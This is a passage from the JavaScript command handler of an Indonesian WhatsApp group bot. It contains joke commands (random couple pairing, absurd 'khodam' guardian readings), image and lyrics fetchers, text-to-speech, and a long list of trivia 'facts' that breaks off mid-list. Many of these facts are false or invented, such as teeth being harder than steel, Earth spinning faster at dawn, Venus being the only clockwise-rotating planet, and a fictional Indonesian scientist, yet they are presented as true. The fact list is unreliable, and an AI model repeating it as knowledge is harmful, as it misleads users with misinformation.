    "BUCIN TINGKAT PAKET LENGKAP! \u{1F9E1}\u{1F49E}",
    "YANG MASIH SINGLE, SABAR YA! \u{1F602}\u{1F494}",
    "GRUP AUTO UBAH NAMA JADI LOVE GROUP! \u{1F495}\u{1F49D}",
    "LOVE RADIATION DETECTED! \u{1F4A8}\u{1F495}",
    "CIEE YANG TIAP DETIK VC-AN! \u{1F4AC}\u{1F495}",
    "SEPERTI COUPLE FILM DISNEY! \u{1F9D0}\u{1F48D}",
]

    const caption = `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}\n\n${salting[Math.floor(Math.random() * salting.length)]}`

    XeonBotInc.sendMessage(m.chat, 
    { 
        text: caption,
        contextInfo: {
            mentionedJid: [orang, jodoh]
        }
    }, 
    { quoted: m })        
}
break
case 'cekkhodam': {
    if (!m.isGroup) return XeonStickGroup()
    let orang = m.sender // Mengambil ID pengirim pesan

    const salting = [
        "Wih, kamu lagi dijaga sama KHODAM ULAR BERKEPALA KUTANG! \u{1F40D}\u{1F459}",
        "Hati-hati, KHODAM MONYET BERPENAMPILAN DJ lagi ngeliput kamu! \u{1F435}\u{1F3A7}",
        "Gokil, kamu dikerubungi sama KHODAM BIKER GILA! \u{1F3CD}\u{1F918}",
        "Bersiap-siap, ada KHODAM KUCING PENCINTA SPAGHETTI siap menemani kamu! \u{1F431}\u{1F35D}",
        "Awas, KHODAM KAPAL PESAWAT lagi terbang bareng kamu! \u{2708}\u{1F4A5}",
        "Waduh, kamu lagi dijaga sama KHODAM CACING PEMINAT CREAM CAKE! \u{1F41B}\u{1F370}",
        "Kamu ada di bawah perlindungan dari KHODAM KAMBING PENCINTA DANGDUT! \u{1F410}\u{1F3B5}",
        "Haha, hati-hati! KHODAM KUCING PENGUSAHA KAFE lagi nongkrong sama kamu! \u{1F431}\u{2615}",
        "Jangan takut, kamu dilindungi oleh KHODAM GORILLA PEMAIN BASKET! \u{1F98D}\u{1F3C0}",
        "Wah, kamu lagi diproteksi sama KHODAM ITIK BAWAH PANGKAL JEMBATAN! \u{1F986}\u{1F309}",
        "Tunggu, KHODAM KALENG KOPI siap menemani malam kamu! \u{2615}\u{1F47B}",
        "Gila, kamu dijaga oleh KHODAM PENYELAMAT PIZZA HAWAII! \u{1F355}\u{1F3D6}",
        "Siap-siap, KHODAM BURUNG KAKAK TUA yang suka ngelawak lagi ikut kamu! \u{1F99C}\u{1F3A4}",
        "Eh, kamu dikerubungi sama KHODAM BEBEK PENYUKA TANGGA! \u{1F426}\u{1F3B5}",
        "Awas, KHODAM KUCING HIJAU yang doyan main gitar lagi datang! \u{1F431}\u{1F3B8}",
        "Kamu dikawal sama KHODAM KAMBING PENCINTA MIE INSTAN! \u{1F410}\u{1F35C}",
        "Hati-hati, KHODAM KERBAU PENYUKA SAUS TOMAT siap mengamankan kamu! \u{1F403}\u{1F345}",
        "Wah, kamu lagi dibuntuti sama KHODAM KAPIBARA PENGGILA SATRIA! \u{1F9A6}\u{1F3AE}",
        "Tunggu sebentar, KHODAM TUPAI PECINTA ES KRIM lagi ikut nyantai bareng kamu! \u{1F43F}\u{1F368}",
        "Kamu lagi dilindungi sama KHODAM BELALANG PENYUKA KUE LONJAKAN! \u{1F99F}\u{1F367}",
    "Siap-siap, KHODAM PAUS PENCINTA PELANGI lagi siap mengawal kamu! \u{1F40B}\u{1F308}",
    "Hati-hati, KHODAM BEBEK PENGEN JADI SELEBRITI TikTok lagi ikut kamu! \u{1F426}\u{1F3B6}",
    "Awas, KHODAM PENYU PENCINTA BURUNG KAKAK TUA lagi ngikutin langkah kamu! \u{1F422}\u{1F99C}",
    "Kamu lagi dijaga oleh KHODAM KUCING HITAM PENCINTA GAME HORROR! \u{1F431}\u{1F47B}",
    "Jangan khawatir, KHODAM GIGITAN SERIGALA PENCINTA KAROKE siap menjaga kamu! \u{1F43A}\u{1F3B9}",
    "Awas, ada KHODAM SIPUT PEMINAT NUGGET lagi siap menemani kamu! \u{1F40C}\u{1F371}",
    "Wow, kamu dilindungi sama KHODAM IKAN PAUS PEMAIN GITAR! \u{1F40B}\u{1F3B8}",
    "Tunggu sebentar, KHODAM SINGA PENYUKA JOGET ZUMBA lagi ikut ngikutin kamu! \u{1F981}\u{1F57A}",
    "Hati-hati, KHODAM PELIKAN PENCINTA NGEBUBURIT LAGI NEMBAK KAMU! \u{1F9A9}\u{1F647}",
    "Eh, kamu lagi dijaga sama KHODAM KERAPU PEMINAT SUSHI ROLL! \u{1F420}\u{1F363}",
    "Wih, KHODAM LEMUR PENCINTA KOPI KELAPA lagi ikut nonton kamu! \u{1F98C}\u{1F9C4}",
    "Siap-siap, KHODAM KATAK PENCINTA DONGENG HALLOWEEN lagi siap menjaga kamu! \u{1F438}\u{1F383}",
    "Gila, kamu lagi dikawal sama KHODAM KAMBING BERSENI LUKIS! \u{1F410}\u{1F5A8}",
    "Wah, KHODAM DURIAN PENYUKA BOLA VOLI lagi menemani kamu! \u{1F951}\u{1F3C0}",
    "Awas, ada KHODAM PELIPAT KERTAS PENCINTA PENDAPATAN POKEMON! \u{1F4D4}\u{1F9B2}",
    "Kamu dilindungi oleh KHODAM BUNGUR PENCINTA KPOP lagi siap bersamamu! \u{1F33F}\u{1F3B6}",
    "Jangan takut, KHODAM GIGI BERLUBANG PENCINTA BATIK lagi ikut dalam langkah kamu! \u{1F9B7}\u{1F473}",
    "Tunggu dulu, KHODAM SINGA PENCINTA SERAMBI KELAPA lagi siap menemani kamu! \u{1F981}\u{1F965}",
    "Kamu lagi terjaga dengan KHODAM BURUNG KAKAK TUA PEMINAT FANTASI! \u{1F99C}\u{1F3A8}",
    "Hati-hati, KHODAM DURIAN PENCINTA KERIPIK LAPIS siap ikut menjagamu! \u{1F951}\u{1F9C6}",
    "Awas, KHODAM BEE PENCINTA LIQUID LUNCH lagi siap bertindak! \u{1F41D}\u{1F963}",
    "Kamu sedang dijaga oleh KHODAM RAKUN PENCINTA FASHION! \u{1F99D}\u{1F457}",
    "Awas, KHODAM KERBAU PENCINTA KEBAB lagi siap menemani kamu! \u{1F403}\u{1F969}",
    "Hati-hati, KHODAM KUCING PENCINTA KUE PASTEL lagi mengawasi langkahmu! \u{1F431}\u{1F950}",
    "Siap-siap, KHODAM KUDA PENCINTA FANTASI NARUTO lagi ikut menemani kamu! \u{1F40E}\u{1F3FB}",
    "Kamu terjaga dengan KHODAM PELIPAT KERTAS PENCINTA GAME KAHOOT! \u{1F4D2}\u{1F3AE}",
    "Wah, ada KHODAM BANTENG PENCINTA FILM HORROR siap menemani kamu! \u{1F402}\u{1F47B}",
    "Tunggu, KHODAM MONYET PENCINTA DRAMA KOREA lagi ngikutin kamu! \u{1F435}\u{1F3A4}",
    "Kamu sedang dijaga oleh KHODAM KUCING BERSEPEDA PEMINAT COTTON CANDY! \u{1F431}\u{1F6B2}",
    "Gokil, KHODAM DURIAN PENCINTA MUSIK JAZZ lagi siap nge-backup kamu! \u{1F951}\u{1F3B8}",
    "Kamu dilindungi oleh KHODAM DURIAN PENCINTA SWIMMING POOL lagi siap menemani kamu! \u{1F951}\u{1F3CA}",
    "Siap-siap, KHODAM BURUNG ELANG PENCINTA SUSHI siap menemani kamu! \u{1F985}\u{1F363}",
    "Hati-hati, KHODAM KUCING PENCINTA SUSHI dan SAMBAL! \u{1F431}\u{1F36D}",
    "Waduh, ada KHODAM DURIAN PENCINTA BUBUR KACANG HIJAU lagi mengintai kamu! \u{1F951}\u{1F95F}",
    "Awas, KHODAM KAMBING PENCINTA CAPPUCCINO lagi siap menemani kamu! \u{1F410}\u{2615}",
    "Tunggu, KHODAM BURUNG PENCINTA KARAOKE lagi ikut menjaga kamu! \u{1F426}\u{1F3B9}",
    "Kamu sedang dilindungi oleh KHODAM KUCING PENCINTA ICE CREAM! \u{1F431}\u{1F368}",
    "Siap-siap, KHODAM PELIPAT KERTAS PENCINTA RAP lagi menjaga kamu! \u{1F4D2}\u{1F3B8}",
    "Jangan khawatir, KHODAM KAPIBARA PENCINTA WAFFLE siap mengawal kamu! \u{1F9A6}\u{1F9C7}",
    "Kamu sedang dijaga oleh KHODAM PANDA PENCINTA POKEMON GO! \u{1F43C}\u{1F3AE}",
    "Gila, KHODAM LELE PENCINTA TEMPURA lagi siap menemani kamu! \u{1F40D}\u{1F364}",
        "Kamu lagi terjaga dengan KHODAM LIPAN PENYUKA BURGER! \u{1F41D}\u{1F354}",
    "Hati-hati, KHODAM PENYIHIR LAGI CARI RAMUAN KOPI ngikutin kamu! \u{1F9D9}\u{FE0F}\u{2615}",
    "Waduh, kamu dilindungi oleh KHODAM SINGA PENCINTA SERUNDENG! \u{1F98F}\u{1F35B}",
    "Kamu terjaga sama KHODAM KUCING PENYUKA KASUR AIR! \u{1F431}\u{1F6C0}",
    "Awas, ada KHODAM ANJING PENCINTA SANDWICH siap nyerang kamu! \u{1F415}\u{1F96A}",
    "Gokil, kamu dijaga sama KHODAM BABI BERMATA LUMBERJACK! \u{1F416}\u{1F6A7}",
    "Siap-siap, KHODAM KAPIBARA PEMAIN SEPAK TAKRAW lagi ngelindungi kamu! \u{1F9A6}\u{1F3C8}",
    "Kamu ada di bawah perlindungan KHODAM PINGUIN PENCINTA ROTI BAKAR! \u{1F427}\u{1F35E}",
    "Hati-hati, KHODAM KAMBING BERGAYA BIKER lagi siap menjaga kamu! \u{1F410}\u{1F3CD}",
    "Wih, ada KHODAM KUCING PENCINTA LAPTOP siap menemani kamu! \u{1F431}\u{1F4BB}",
    "Tunggu, KHODAM KAPAL PESAWAT PENCINTA PANTAI lagi ikut melindungi kamu! \u{2708}\u{1F3D6}",
    "Awas, KHODAM KOALA PENYUKA KAOS KAKI lagi ngikutin kamu! \u{1F428}\u{1F9E6}",
    "Siap-siap, KHODAM ANJING PENCINTA BOLA TENIS lagi ngelindungi kamu! \u{1F415}\u{1F3BE}",
    "Wah, kamu dilindungi oleh KHODAM RUSA PENCINTA BURGER! \u{1F98C}\u{1F354}",
    "Kamu dilindungi oleh KHODAM MONYET PENCINTA NENEK yang jago main angklung! \u{1F412}\u{1F3B5}",
    "Hati-hati, KHODAM SINGA PENCINTA BOLU GULUNG lagi ngikutin kamu! \u{1F98F}\u{1F36C}",
    "Kamu terjaga sama KHODAM KUCING PENYUKA ROKOK GULUNGAN! \u{1F431}\u{1F6B6}",
    "Awas, KHODAM ITIK PENCINTA KUE RICE CAKE lagi melindungi kamu! \u{1F986}\u{1F359}",
    "Siap-siap, KHODAM PAUS PENCINTA JELLY lagi ikut ngejagain kamu! \u{1F99C}\u{1F368}",
    "Wah, kamu dijaga oleh KHODAM PENYELAMAT PIZZA HAWAII! \u{1F355}\u{1F3D6}",
    "Tunggu, ada KHODAM BURUNG HANTU PENCINTA KUCAK-PAK! \u{1F989}\u{1F3A4}",
    "Siap-siap, KHODAM MONYET PENCINTA GULA PASIR yang ngikutin kamu! \u{1F412}\u{1F36F}",
    "Kamu dilindungi oleh KHODAM PENGUIN PENYUKA KESERUHAN SOYA MILK! \u{1F427}\u{1F95B}",
    "Awas, KHODAM LIPAN PENYUKA YOGURT ANGGUR lagi melindungi kamu! \u{1F41D}\u{1F347}",
    "Siap-siap, KHODAM ANJING PENCINTA NUGGET RING lagi ngawasi kamu! \u{1F415}\u{1F95D}",
    "Gokil, kamu dilindungi oleh KHODAM DURIAN PENCINTA PEDE lagi ngikutin kamu! \u{1F951}\u{1F609}",
    "Kamu dilindungi oleh KHODAM KUCING PENYUKA SEJAK 1985! \u{1F431}\u{1F519}",
    "Hati-hati, KHODAM BURUNG KAKAK TUA PENCINTA BERSIH-BERSIH lagi nyerang kamu! \u{1F99C}\u{1F9EB}",
    "Kamu dikerubungi sama KHODAM PAUS PENCINTA LIPSTIK MERAH! \u{1F99C}\u{1F484}",
    "Siap-siap, ada KHODAM KAPIBARA PENCINTA GULAI BUAH! \u{1F9A6}\u{1F965}",
    "Gokil, kamu dilindungi oleh KHODAM TUPAI PENCINTA PERCAMBAHAN! \u{1F43F}\u{1F331}",
    "Awas, KHODAM KUCING PENCINTA JUNGKIR-BALIK siap menjaga kamu! \u{1F431}\u{1F938}",
    "Tunggu sebentar, KHODAM KAMBING PENCINTA PELAMINAN lagi ngikutin kamu! \u{1F410}\u{1F492}",
    "Wih, KHODAM RUSA PENCINTA SUSU MURNI lagi terjaga bersama kamu! \u{1F98C}\u{1F95B}",
    "Hati-hati, KHODAM ITIK PENCINTA SALAD lagi melindungi kamu! \u{1F986}\u{1F957}",
    "Gokil, ada KHODAM MONYET PENCINTA KARTU POSTAL yang ngikutin kamu! \u{1F412}\u{1F4EC}",
    "Wah, kamu dilindungi oleh KHODAM KUCING PENCINTA ASAM PEDAS! \u{1F431}\u{1F36C}",
    "Siap-siap, ada KHODAM KAMBING PENCINTA JAKET JEANS yang ikut menjaga kamu! \u{1F410}\u{1F456}",
    "Tunggu, KHODAM KUCING PENCINTA WAJIB BAKTI lagi ngelindungi kamu! \u{1F431}\u{1F9D1}\u{200D}\u{1F3A8}",
    "Awas, KHODAM PAUS PENCINTA RIAU lagi menyusul kamu! \u{1F99C}\u{1F34D}",
    "Siap-siap, KHODAM ANJING PENCINTA TUNGGU DI LOBI yang melindungi kamu! \u{1F415}\u{1F4D6}",
    "Kamu dilindungi oleh KHODAM BURUNG PENCINTA PIKNIK! \u{1F989}\u{1F3D6}",
    "Tunggu, ada KHODAM KOALA PENCINTA BUBUR AYAM yang menemani kamu! \u{1F428}\u{1F35C}",
    "Siap-siap, ada KHODAM BABI PENCINTA SKATEBOARD yang menjaga kamu! \u{1F416}\u{1F6F9}",
    "Gokil, KHODAM MONYET PENCINTA WARKOP lagi melindungi kamu! \u{1F412}\u{2615}",
    "Waduh, ada KHODAM KAPIBARA PENCINTA COCONUT WATER yang mengawasi kamu! \u{1F9A6}\u{1F965}",
    "Siap-siap, KHODAM KUCING PENCINTA DUKUN lagi ngikutin kamu! \u{1F431}\u{1F9D9}",
    "Kamu terjaga sama KHODAM PAUS PENCINTA RAMBUT PALSU! \u{1F99C}\u{1F9B2}",
    "Hati-hati, KHODAM BEBEK PENCINTA BATERAI EKSTERNAL lagi melindungi kamu! \u{1F986}\u{1F50B}",
    "Kamu dilindungi oleh KHODAM GITAR PENCINTA PLASTIK PECAH! \u{1F3B8}\u{1F9F0}",
    "Tunggu, ada KHODAM KAMBING PENCINTA KEJU ISI dalam perjalanan! \u{1F410}\u{1F9C0}"
];
    

    const caption = `*MARI KITA CEK :* \n\n${salting[Math.floor(Math.random() * salting.length)]}`

    XeonBotInc.sendMessage(m.chat, 
    { 
        text: caption
    }, 
    { quoted: m })        
}
break
                        case 'coffee': case 'kopi': {
                XeonBotInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcxeon('Enter Query Title')
                await XeonStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                XeonBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcxeon('Enter Query Title')
                await XeonStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                XeonBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            
            case 'random': {
            let type = (command).toLowerCase()
  let baseUrl = 'https://weeb-api.vercel.app/'
  const fetchImage = async (endpoint) => {
    try {
      const response = await fetch(baseUrl + endpoint)
      if (!response.ok) return replygcxeon(`Error fetching ${type} image`)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      XeonBotInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${type}`}, {quoted: m})
    } catch (error) {
      console.error(error)
      replygcxeon(`An error occurred while fetching the ${type} image. Please use the command properly \nExample: ${prefix + command} loli\n`)
    }
  }
  switch (type) {
    case 'loli':
      fetchImage('loli')
      break
    case 'waifu':
      fetchImage('waifu')
      break
    case 'neko':
      fetchImage('neko')
      break
    case 'zerotwo':
      fetchImage('zerotwo')
      break
    default:    
      break
  }
  }
  break
            
case 'lirik': {
    if (!text) return replygcxeon(`Lirik lagu apa yang ingin kamu cari?\nContoh penggunaan: ${prefix}lirik Thunder`)
    await XeonStickWait()
    const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
    const result = await lyricsv2(text).catch(async _ => await lyrics(text))
    replygcxeon(`
*Judul :* ${result.title}
*Penulis :* ${result.author}
*Url :* [${result.link}](${result.link})

*Lirik :* 
${result.lyrics}
    `.trim())
}
break

     case 'say': case 'tts': case 'gtts':{
if (!text) return replygcxeon(' *text nya mana cuy*?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return XeonBotInc.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    // Fakta dalam bahasa Indonesia
    const factsInIndonesian = [
        "Madu tidak pernah basi.",
        "Pisang adalah buah beri, tetapi stroberi bukan.",
        "Hati udang berada di kepalanya.",
        "Gurita memiliki tiga hati.",
        "Kamu tidak bisa mendengung sambil menahan hidung.",
        "Sekelompok flamingo disebut 'flamboyance'.",
        "Kotoran wombat berbentuk kubus.",
        "Kelelawar bisa menahan napas hingga 40 menit di bawah air.",
        "Jerapah tidak bisa menundukkan kepala mereka ke tanah.",
        "Kucing bisa berputar tubuhnya hingga 180 derajat saat jatuh.",
        "Ada lebih banyak bintang di alam semesta daripada butir pasir di bumi.",
        "Mata manusia bisa membedakan sekitar 10 juta warna.",
        "Kelelawar adalah satu-satunya mamalia yang bisa terbang.",
        "Semut bisa berlari dengan kecepatan hingga 8 km per jam.",
        "Pisang mengandung lebih banyak potasium daripada buah apapun.",
        "Ketika kelelawar terbang, mereka bergerak menggunakan ekor mereka sebagai pedoman.",
        "Dinosaur pertama kali muncul lebih dari 230 juta tahun yang lalu.",
        "Lumba-lumba tidur dengan satu sisi otak mereka saja.",
        "Tikus bisa melompat hingga ketinggian 50 kali panjang tubuhnya.",
        "Kepiting memiliki 10 kaki, termasuk dua cakar besar.",
        "Lautan menutupi sekitar 71% permukaan bumi.",
        "Singa adalah satu-satunya kucing besar yang hidup dalam kelompok.",
        "Kelelawar adalah satu-satunya mamalia yang bisa terbang.",
        "Air terjun Victoria di perbatasan Zambia dan Zimbabwe adalah salah satu yang terbesar di dunia.",
        "Burung flamingo lahir dengan warna abu-abu, bukan merah muda.",
        "Semut memiliki kekuatan untuk mengangkat beban hingga 50 kali berat tubuh mereka.",
        "Kucing bisa mendeteksi suhu tubuh manusia dan menyesuaikan posisi tidur mereka.",
        "Pulau Komodo di Indonesia adalah rumah bagi kadal terbesar di dunia.",
        "Tahun kabisat terjadi setiap empat tahun untuk menyesuaikan kalender dengan gerakan Bumi.",
        "Bambu adalah tanaman yang tumbuh tercepat di dunia, bisa mencapai 90 cm dalam sehari.",
        "Beruang kutub tidak memiliki selaput mata seperti manusia, sehingga mereka melihat semua benda dengan latar belakang hijau.",
        "Pohon terbesar di dunia adalah pohon redwood di California.",
        "Sungai Nil di Afrika adalah sungai terpanjang di dunia.",
        "Ikan paus biru dapat memiliki berat lebih dari 150 ton, lebih berat daripada dinosaurus terbesar.",
        "Kuda laut jantan bisa melahirkan anak-anaknya.",
        "Pinguin adalah burung yang tidak bisa terbang tetapi sangat mahir berenang.",
        "Lebah memiliki kemampuan untuk mengenali wajah manusia.",
        "Kupu-kupu bisa merasakan rasa dengan kaki mereka.",
        "Mata burung elang bisa melihat objek dengan ketajaman 4 hingga 5 kali lebih tajam daripada manusia.",
        "Jerapah memiliki lidah yang panjangnya mencapai 45 cm.",
        "Air terjun Angel di Venezuela adalah yang tertinggi di dunia, dengan ketinggian lebih dari 3.000 kaki.",
        "Manusia dapat mengingat hingga 1.000 wajah yang berbeda.",
        "Ular tidak memiliki kelopak mata, sehingga mereka terus-menerus mengandalkan lapisan pelindung transparan di matanya.",
        "Sapi memiliki teman dan bisa merasakan stres ketika berpisah dari mereka.",
        "Kelelawar vampire adalah satu-satunya mamalia yang memakan darah.",
        "Di Antartika, suhu bisa mencapai -80�C atau lebih rendah.",
        "Ada lebih dari 400 jenis apel yang dibudidayakan di seluruh dunia.",
        "Bumi berputar pada kecepatan sekitar 1.670 km per jam di khatulistiwa.",
        "Kupu-kupu memiliki siklus hidup yang terdiri dari 4 tahap: telur, larva, pupa, dan dewasa.",
        "Panda adalah salah satu hewan yang paling dilindungi di dunia.",
        "Manusia memiliki lebih banyak bakteri dalam tubuh mereka daripada sel-sel tubuh.",
        "Mata manusia bisa membedakan lebih dari 10 juta warna.",
        "Lautan Pasifik adalah laut terbesar di dunia.",
        "Sekelompok domba dapat mencakup ratusan atau bahkan ribuan individu.",
        "Tuhan memberikan kemampuan bagi manusia untuk merasakan lima indra: penglihatan, pendengaran, penciuman, perasa, dan peraba.",
        "Tikus dapat bertahan hidup tanpa air selama sekitar dua minggu.",
        "Burung kolibri adalah satu-satunya burung yang dapat terbang mundur.",
        "Bulan memiliki pengaruh besar terhadap pasang surut laut di Bumi.",
        "Cheetah adalah hewan darat tercepat di dunia, bisa mencapai 100 km per jam.",
        "Lions mane jellyfish memiliki tentakel sepanjang 36 meter, lebih panjang dari kebanyakan paus.",
        "Kepiting raja dapat mencapai ukuran tubuh hingga 1 meter.",
        "Burung beo dapat meniru suara manusia dengan sangat baik.",
        "Penyu bisa hidup lebih dari 100 tahun.",
        "Bumi adalah satu-satunya planet yang dikenal memiliki kehidupan.",
        "Hiu bisa hidup hingga 30 tahun atau lebih.",
        "Katak bisa bertahan hidup tanpa air selama musim dingin dengan hibernasi.",
        "Gigi manusia lebih keras dari baja.",
        "Ada lebih banyak bintang di langit daripada butiran pasir di seluruh dunia.",
        "Di dunia ini, hanya sekitar 5% dari lautan yang telah dipetakan sepenuhnya.",
        "Bambang, seorang ilmuwan Indonesia, berhasil menemukan cara untuk menggunakan energi angin sebagai sumber energi.",
        "Sungai Amazon menghasilkan sekitar 20% oksigen di Bumi.",
        "Ular memiliki lebih dari 400 jenis yang berbeda di seluruh dunia.",
        "Dunia ini memiliki lebih dari 100.000 jenis pohon.",
        "Kucing bisa berlari hingga 48 km per jam.",
        "Plankton adalah bagian penting dari rantai makanan laut.",
        "Kambing memiliki penglihatan 360 derajat.",
        "Jerapah adalah hewan dengan leher terpanjang di dunia.",
        "Kuda dapat berlari lebih cepat daripada manusia.",
        "Manusia dan kuda memiliki kadar oksigen yang hampir sama dalam darah mereka.",
        "Kerang mutiara bisa hidup hingga lebih dari 50 tahun.",
        "Belut listrik dapat menghasilkan voltase hingga 600 volt.",
        "Seperti manusia, ikan juga bisa mengalami stress.",
        "Air mata buaya tidak hanya karena perasaan, tapi juga akibat iritasi pada mata mereka.",
        "Anjing memiliki indra penciuman yang 40 kali lebih tajam dari manusia.",
        "Otak manusia lebih aktif ketika tidur daripada saat terjaga.",
        "Ada lebih dari 3.000 spesies burung di dunia.",
        "Evolusi manusia dimulai lebih dari 5 juta tahun yang lalu.",
        "Pelikan bisa menyimpan hingga 13 liter air dalam kantung mulut mereka.",
        "Hiu putih besar bisa berenang lebih dari 60 km per jam dalam waktu singkat.",
        "Sebagian besar kawanan lebah terdiri dari pekerja perempuan.",
        "Tanaman beradaptasi untuk bisa tumbuh di hampir setiap ekosistem di bumi.",
        "Kucing bisa tidur hingga 18 jam sehari.",
        "Tikus memiliki indra penciuman yang sangat kuat.",
        "Tawon bisa hidup lebih lama saat musim panas.",
        "Pohon oak dapat hidup hingga 200 tahun.",
        "Air terjun Niagara menghasilkan 2,4 juta liter air per detik.",
        "Kucing bisa melompat hingga 6 kali panjang tubuhnya.",
        "Lumba-lumba dapat tidur hanya setengah dari otaknya untuk tetap aktif.",
        "Tumbuhan memiliki kemampuan untuk bereaksi terhadap suara.",
        "Domba bisa mengingat wajah manusia selama bertahun-tahun.",
        "Anjing dapat mendeteksi penyakit seperti kanker melalui bau.",
        "Burung hantu tidak hanya terbang dengan senyap, tetapi juga bisa memutar kepala mereka hingga 270 derajat.",
        "Sekelompok ikan tuna bisa memiliki ribuan individu.",
        "Bumi memiliki lebih dari 1.500 gunung berapi aktif.",
        "Otak manusia memiliki lebih dari 100 miliar sel saraf.",
        "Semut bisa hidup di bawah tanah dalam jaringan sarang yang luas.",
        "Manusia memiliki lebih dari 640 otot dalam tubuh mereka.",
        "Sekelompok lumba-lumba bisa berbicara satu sama lain menggunakan berbagai jenis suara.",
        "Bumi adalah satu-satunya tempat di tata surya yang memiliki kehidupan yang diketahui.",
        "Bulan selalu menampilkan sisi yang sama ke Bumi karena rotasinya yang sinkron.",
        "Burung flamingo dapat hidup lebih dari 20 tahun di alam liar.",
        "Singa betina berburu lebih sering daripada singa jantan.",
        "Tumbuhan dapat tumbuh lebih cepat jika mereka mendengar musik.",
        "Kucing bisa melihat dalam kegelapan lebih baik daripada manusia.",
        "Bumi memiliki lebih dari 100.000 jenis alga.",
        "Gajah adalah satu-satunya hewan yang tidak dapat melompat.",
        "Bulan memiliki pengaruh besar terhadap pasang surut air laut.",
        "Ada lebih dari 700 spesies kelelawar yang diketahui di dunia.",
        "Suhu di gurun bisa lebih dari 50�C pada siang hari.",
        "Kecepatan angin di tropis bisa mencapai lebih dari 150 km per jam.",
        "Penguin adalah satu-satunya burung yang tidak bisa terbang tetapi ahli berenang.",
        "Kucing bisa berlari hingga 48 kilometer per jam.",
        "Kebanyakan debu rumah berasal dari kulit mati manusia.",
        "Hanya ada satu benua yang tidak memiliki gurun, yaitu Eropa.",
        "Manusia memiliki 206 tulang di tubuh mereka.",
        "Bumi sebenarnya berputar lebih cepat di khatulistiwa.",
        "Laut Mati adalah danau asin yang terletak di antara Yordania dan Israel.",
        "Tertawa dapat meningkatkan kesehatan jantung.",
        "Kita memiliki sekitar 100.000 rambut di kepala kita.",
        "Air panas membeku lebih cepat daripada air dingin.",
        "Buaya dapat bertahan hidup tanpa makan selama beberapa bulan.",
        "Gorila bisa tertawa seperti manusia.",
        "Di dunia ini ada sekitar 7.000 bahasa yang berbeda.",
        "Otak manusia lebih aktif saat tidur daripada saat terjaga.",
        "Cahaya matahari membutuhkan waktu 8 menit untuk sampai ke bumi.",
        "Kucing tidur hingga 16 jam sehari.",
        "Pada tahun 1912, kapal Titanic tenggelam dalam perjalanan perdananya.",
        "Ular tidak memiliki kelopak mata.",
        "Pikiran manusia bisa berkeliling dunia dalam hitungan detik.",
        "Ikan paus bisa bernapas selama 30 menit tanpa perlu ke permukaan air.",
        "Ada lebih dari 1000 jenis keju di dunia.",
        "Manusia dan Dinosaurus tidak pernah hidup bersama.",
        "Orang yang tertawa lebih dari dua kali sehari lebih mungkin hidup lebih lama.",
        "Tanpa gravitasi, kita akan terbang keluar dari Bumi.",
        "Cumi-cumi bisa mengubah warna kulitnya untuk berkamuflase.",
        "Pemimpin Prancis pertama, Napoleon Bonaparte, tidak pernah setinggi yang sering dikatakan.",
        "Di luar angkasa, tidak ada suara karena tidak ada udara untuk membawa gelombang suara.",
        "Seekor belut bisa menghasilkan listrik hingga 600 volt.",
        "Kuda tidak bisa tidur berdiri sepenuhnya, mereka hanya bisa beristirahat dalam posisi itu.",
        "Ikan Clownfish bisa berganti jenis kelamin jika pasangan mereka mati.",
        "Mars memiliki gunung berapi terbesar di tata surya, yaitu Olympus Mons.",
        "Mata burung elang dapat melihat objek lima kali lebih jauh daripada manusia.",
        "Manusia dapat hidup tanpa makanan selama sekitar 3 minggu, tetapi hanya 3 hari tanpa air.",
        "Tumbuhan dapat 'berbicara' satu sama lain menggunakan sinyal kimia.",
        "Ketika seseorang tersenyum, 17 otot di wajahnya bekerja.",
        "Sapi memiliki teman dan dapat stres jika dipisahkan.",
        "Semut bisa mengangkat benda yang lebih berat daripada tubuh mereka sendiri.",
        "Duri pada tanaman mawar terbuat dari jaringan yang sama dengan rambut manusia.",
        "Venus adalah satu-satunya planet yang berputar searah jarum jam.",
        "Air terjun Angel di Venezuela adalah yang tertinggi di dunia.",
        "Hiu adalah satu-satunya ikan yang bisa berkedip.",
        "Singa tidur hingga 20 jam sehari.",
        "Tanpa pohon, kehidupan di bumi akan sangat sulit untuk bertahan.",
        "Otak manusia berkembang pesat dalam 2 tahun pertama kehidupan.",
        "Bumi berputar lebih cepat pada saat fajar dan senja.",
        "Lebah adalah satu-satunya serangga yang menghasilkan makanan yang dimakan oleh manusia.",
        "Di dunia ini, lebih banyak orang memiliki ponsel daripada akses ke toilet.",
        "Kuda laut jantan yang mengandung dan melahirkan anak.",
        "Kepiting raja memiliki cangkang yang dapat menahan tekanan laut yang besar.",
        "Suara gajah lebih keras dari pesawat jet.",
        "Ular bisa mendeteksi panas dengan indra khusus yang ada di wajah mereka.",
        "Cheetah adalah hewan darat tercepat di dunia.",
        "Es di Antartika bisa mencapai ketebalan hingga 4,7 kilometer.",
        "Burung penguin tidak bisa terbang, tetapi mereka sangat cepat berenang.",
        "Kucing memiliki kemampuan untuk beradaptasi dengan berbagai lingkungan.",
        "Anjing memiliki indera penciuman yang 40 kali lebih tajam dari manusia.",
        "Burung kolibri adalah satu-satunya burung yang bisa terbang mundur.",
